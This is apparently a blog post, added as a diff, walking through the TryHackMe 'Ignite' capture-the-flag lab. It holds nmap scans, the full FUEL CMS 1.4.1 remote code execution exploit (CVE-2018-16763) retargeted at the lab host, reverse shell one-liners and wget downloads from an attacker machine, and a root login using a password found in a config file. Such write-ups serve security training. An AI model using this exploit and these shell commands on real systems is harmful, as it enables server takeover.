@@ -1,0 +1,294 @@
+---
+layout: post
+title:  "Tryhackme: Ignite"
+date:   2021-02-13 19:15:56 +0200
+categories: tryhackme
+---
+
+## Nmap Scan ##
+### Initial Port Scan ###
+```
+sudo nmap -p- -T5 -vv 10.10.93.16
+```
+```
+Nmap scan report for 10.10.93.16
+Host is up, received reset ttl 63 (0.079s latency).
+Scanned at 2021-02-13 12:38:54 EST for 216s
+Not shown: 65517 closed ports
+Reason: 65517 resets
+PORT      STATE    SERVICE   REASON
+80/tcp    open     http      syn-ack ttl 63
+2974/tcp  filtered signal    no-response
+10008/tcp filtered octopus   no-response
+13716/tcp filtered netbackup no-response
+14503/tcp filtered unknown   no-response
+15543/tcp filtered unknown   no-response
+15978/tcp filtered unknown   no-response
+21412/tcp filtered unknown   no-response
+27880/tcp filtered unknown   no-response
+37262/tcp filtered unknown   no-response
+45129/tcp filtered unknown   no-response
+50048/tcp filtered unknown   no-response
+52608/tcp filtered unknown   no-response
+53300/tcp filtered unknown   no-response
+53746/tcp filtered unknown   no-response
+61367/tcp filtered unknown   no-response
+61583/tcp filtered unknown   no-response
+63402/tcp filtered unknown   no-response
+```
+That is very interesting! From what we can see, the server might be behind a firewall.
+
+### Targeted Port Scan ###
+Let's try to run a fragmented and malformed scan and see if we can bypass the filters
+```
+sudo nmap -sXCV -T5 -p 80,2974,10008,13716,14503,15543,15978,21412,27880,37262,45129,50048,52608,53300,53746,61367,61583,63402 -vv -f 10.10.93.16
+```
+```
+Nmap scan report for 10.10.93.16
+Host is up, received echo-reply ttl 63 (0.20s latency).
+Scanned at 2021-02-13 12:50:16 EST for 28s
+
+PORT      STATE  SERVICE   REASON       VERSION
+80/tcp    open   http      tcp-response Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to FUEL CMS
+2974/tcp  closed signal    reset ttl 63
+10008/tcp closed octopus   reset ttl 63
+13716/tcp closed netbackup reset ttl 63
+14503/tcp closed unknown   reset ttl 63
+15543/tcp closed unknown   reset ttl 63
+15978/tcp closed unknown   reset ttl 63
+21412/tcp closed unknown   reset ttl 63
+27880/tcp closed unknown   reset ttl 63
+37262/tcp closed unknown   reset ttl 63
+45129/tcp closed unknown   reset ttl 63
+50048/tcp closed unknown   reset ttl 63
+52608/tcp closed unknown   reset ttl 63
+53300/tcp closed unknown   reset ttl 63
+53746/tcp closed unknown   reset ttl 63
+61367/tcp closed unknown   reset ttl 63
+61583/tcp closed unknown   reset ttl 63
+63402/tcp closed unknown   reset ttl 63
+```
+Guess not! Might come back to it later. For now, let's analyze the indicated CMS.
+
+## Fuel CMS Exploitation ##
+![FUEL CMS Home Page](/assets/images/Ignite/FuelCMS.png)
+Doing a simple ```searchsploit``` yields us the following results:
+```
+searchsploit Fuel CMS      
+--------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                   |  Path
+--------------------------------------------------------------------------------- ---------------------------------
+Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                             | php/webapps/48741.txt
+Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                 | php/webapps/48778.txt
+fuelCMS 1.4.1 - Remote Code Execution                                            | linux/webapps/47138.py
+--------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Let's use the last one:
+```
+# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
+# Date: 2019-07-19
+# Exploit Author: 0xd0ff9
+# Vendor Homepage: https://www.getfuelcms.com/
+# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
+# Version: <= 1.4.1
+# Tested on: Ubuntu - Apache2 - php5
+# CVE : CVE-2018-16763
+
+
+import requests
+import urllib
+
+url = "http://127.0.0.1:8881"
+def find_nth_overlapping(haystack, needle, n):
+    start = haystack.find(needle)
+    while start >= 0 and n > 1:
+        start = haystack.find(needle, start+1)
+        n -= 1
+    return start
+
+while 1:
+        xxxx = raw_input('cmd:')
+        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
+        proxy = {"http":"http://127.0.0.1:8080"}
+        r = requests.get(burp0_url, proxies=proxy)
+
+        html = "<!DOCTYPE html>"
+        htmlcharset = r.text.find(html)
+
+        begin = r.text[0:20]
+        dup = find_nth_overlapping(r.text,begin,2)
+
+        print r.text[0:dup]
+```
+
+Though, as we can see, it tries to use a proxy and localhost as the target, so let's change those. The final working script would be:
+```
+import requests
+import urllib
+
+url = "http://10.10.93.16"
+def find_nth_overlapping(haystack, needle, n):
+    start = haystack.find(needle)
+    while start >= 0 and n > 1:
+        start = haystack.find(needle, start+1)
+        n -= 1
+    return start
+
+while 1:
+        xxxx = raw_input('cmd:')
+        url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
+        r = requests.get(url)
+
+        html = "<!DOCTYPE html>"
+        htmlcharset = r.text.find(html)
+
+        begin = r.text[0:20]
+        dup = find_nth_overlapping(r.text,begin,2)
+
+        print r.text[0:dup]
+```
+
+Executing the modified script gives us the result of the given command and an additonal error GET response
+```
+$ python 47138.py
+cmd:whoami
+systemwww-data
+
+<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">
+
+<h4>A PHP Error was encountered</h4>
+
+<p>Severity: Warning</p>
+<p>Message:  preg_match(): Delimiter must not be alphanumeric or backslash</p>
+<p>Filename: controllers/Pages.php(924) : runtime-created function</p>
+<p>Line Number: 1</p>
+
+
+        <p>Backtrace:</p>
+
+
+
+
+
+
+
+
+                        <p style="margin-left:10px">
+                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php(924) : runtime-created function<br />
+                        Line: 1<br />
+                        Function: preg_match                    </p>
+
+
+
+
+
+
+                        <p style="margin-left:10px">
+                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php<br />
+                        Line: 932<br />
+                        Function: array_filter                  </p>
+
+
+
+
+
+
+                        <p style="margin-left:10px">
+                        File: /var/www/html/index.php<br />
+                        Line: 364<br />
+                        Function: require_once                  </p>
+
+
+
+
+</div>
+```
+
+## Setting Foothold ##
+### Starting a Reverse Shell ###
+First let's start a ```netcat``` listener:
+```nc -lvnp 1234```
+Tried several reverse shell techniques:
+```
+nc 10.8.135.88 1234 -e /bin/bash
+```
+Didn't work. So I started a python HTTP server on my machine and tried to download a PHP reverse shell:
+```
+wget http://10.8.135.88:8000/shell.php
+```
+Still didn't work. But luckily, I found the right technique eventually:
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.135.88 1234 >/tmp/f
+```
+
+### Shell Stabilisation ###
+```
+python -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm;
+```
+Press CTRL + Z and now, back on our host machine:
+```
+stty raw -echo; fg
+```
+And press Enter and we're back!
+
+### Getting User Flag ###
+```
+www-data@ubuntu:/var/www/html$ cat ../../../home/www-data/flag.txt 
+```
+
+## Privilege Escalation ##
+Let's start a python HTTP server on our host and download ```linpeas.sh``` to the victim machine
+```
+$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+```
+www-data@ubuntu:/var/www/html$ wget http://10.8.135.88:8000/linpeas.sh
+www-data@ubuntu:/var/www/html$ chmod +x linpeas.sh
+```
+ The relevant finding is the following backup-manager file:
+ ```
+ [+] Searching backup-manager files
+backup-manager file: /var/www/html/fuel/application/config/database.php 
+```
+
+Looking at its contents we find the obvious ```root``` password:
+```
+$db['default'] = array(
+        'dsn'   => '',
+        'hostname' => 'localhost',
+        'username' => 'root',
+        'password' => 'mememe',
+        'database' => 'fuel_schema',
+        'dbdriver' => 'mysqli',
+        'dbprefix' => '',
+        'pconnect' => FALSE,
+        'db_debug' => (ENVIRONMENT !== 'production'),
+        'cache_on' => FALSE,
+        'cachedir' => '',
+        'char_set' => 'utf8',
+        'dbcollat' => 'utf8_general_ci',
+        'swap_pre' => '',
+        'encrypt' => FALSE,
+        'compress' => FALSE,
+        'stricton' => FALSE,
+        'failover' => array(),
+        'save_queries' => TRUE
+);
+```
+
+Let's finish and get the flag!
+```
+www-data@ubuntu:/var/www/html$ su root
+root@ubuntu:/var/www/html# whoami
+root
+root@ubuntu:/var/www/html# cat /root/root.txt 
+```
